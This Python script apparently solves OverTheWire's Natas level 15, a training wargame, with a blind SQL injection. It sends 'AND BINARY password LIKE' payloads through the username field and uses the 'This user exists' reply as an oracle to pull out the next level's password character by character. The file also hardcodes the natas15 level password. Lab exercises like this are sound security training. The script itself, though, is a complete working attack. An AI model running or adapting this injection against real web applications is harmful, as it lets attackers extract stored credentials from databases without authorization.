import requests
import string
import os

USERNAME = 'natas15'
NATAS15_PASSWORD = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url = "http://natas15.natas.labs.overthewire.org/"

ASCII_CHARS = string.ascii_letters + string.digits

file_path = 'password_characters.txt'

session = requests.Session()


def is_file_empty(file_path):
    """Check if file is empty by reading first character in it"""
    # if file doesn't exist or is empty, return True
    return not os.path.exists(file_path) or os.stat(file_path).st_size == 0


def write_to_file(file_path, data):
    """Write data to a file"""
    with open(file_path, 'w') as file:
        file.write(data)


def read_from_file(file_path):
    """Read the contents of a file and return them."""
    try:
        with open(file_path, 'r') as file:
            return file.read()
    except FileNotFoundError:
        print("File not found.")
        return None


def obtain_password_chars():
    password = ''
    for char in ASCII_CHARS:
        payload = f'natas16" AND BINARY password LIKE "%{char}%" #'
        data = {'username': payload}

        response = session.post(url, auth=requests.auth.HTTPBasicAuth(USERNAME, NATAS15_PASSWORD), data=data)
        print(char, end=' ')
        if 'This user exists' in response.text:
            password += char
            print('password chars ', password)

    return password


if is_file_empty(file_path):
    obtained_chars = obtain_password_chars()
    write_to_file(file_path, obtained_chars)
else:
    print("File not empty. Aborting")


def retrieve_password():
    underscore = '_'
    underscore_length = 0
    password = ''

    while len(password) < 32:

        password_chars = read_from_file(file_path)

        for char in password_chars:
            payload = f'natas16" AND BINARY password LIKE \'{underscore * underscore_length + char}%\' #'
            data = {'username': payload}

            response = session.post(url, auth=requests.auth.HTTPBasicAuth(USERNAME, NATAS15_PASSWORD), data=data)

            if 'This user exists' in response.text:
                print('password', char)
                password += char
                underscore_length += 1
                print('password', password)

    return password


# print(retrieve_password())

session.close()
